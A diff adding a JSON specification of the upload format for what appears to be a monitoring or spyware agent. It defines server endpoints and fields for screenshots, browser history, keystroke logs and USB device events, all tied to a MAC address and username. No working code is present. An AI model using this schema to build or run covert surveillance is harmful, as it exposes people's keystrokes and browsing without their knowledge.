@@ -1,0 +1,78 @@
+{
+  "Screenshot": {
+    "method": "POST (multipart/form-data)",
+    "endpoint": "/webapi.php",
+    "fields": {
+      "fileToUpload": "<JPEG image file>",
+      "Event": "Screenshot (implicit)",
+      "Version": "1.0",
+      "MacAddress": "<device MAC address>",
+      "Username": "<from settings.ini>"
+    }
+  },
+  "TicEvent": {
+    "method": "POST (application/json)",
+    "endpoint": "/eventhandler.php",
+    "body": {
+      "Event": "Tic",
+      "Version": "1.0",
+      "MacAddress": "<device MAC address>",
+      "Username": "<from settings.ini>"
+    }
+  },
+  "BrowserHistory": {
+    "method": "POST (application/json)",
+    "endpoint": "/eventhandler.php",
+    "body": {
+      "Event": "BrowserHistory",
+      "Version": "1.0",
+      "MacAddress": "<device MAC address>",
+      "Username": "<from settings.ini>",
+      "BrowserHistories": [
+        {
+          "browser": "Chrome|Firefox|Edge",
+          "url": "<url>",
+          "title": "<page title>",
+          "last_visit": "<timestamp>",
+          "date": "<YYYY-MM-DD HH:MM:SS>"
+        }
+      ]
+    }
+  },
+  "KeyLog": {
+    "method": "POST (application/json)",
+    "endpoint": "/eventhandler.php",
+    "body": {
+      "Event": "KeyLog",
+      "Version": "1.0",
+      "MacAddress": "<device MAC address>",
+      "Username": "<from settings.ini>",
+      "KeyLogs": [
+        {
+          "date": "<YYYY-MM-DD HH:MM:SS>",
+          "application": "<process name (window title)>",
+          "key": "<key combination>"
+        }
+      ]
+    }
+  },
+  "USBLog": {
+    "method": "POST (application/json)",
+    "endpoint": "/eventhandler.php",
+    "body": {
+      "Event": "USBLog",
+      "Version": "1.0",
+      "MacAddress": "<device MAC address>",
+      "Username": "<from settings.ini>",
+      "USBLogs": [
+        {
+          "date": "<YYYY-MM-DD HH:MM:SS>",
+          "device_name": "<USB device name>",
+          "device_path": "<device instance ID>",
+          "device_type": "USB Device",
+          "action": "Connected|Disconnected"
+        }
+      ]
+    }
+  }
+} 
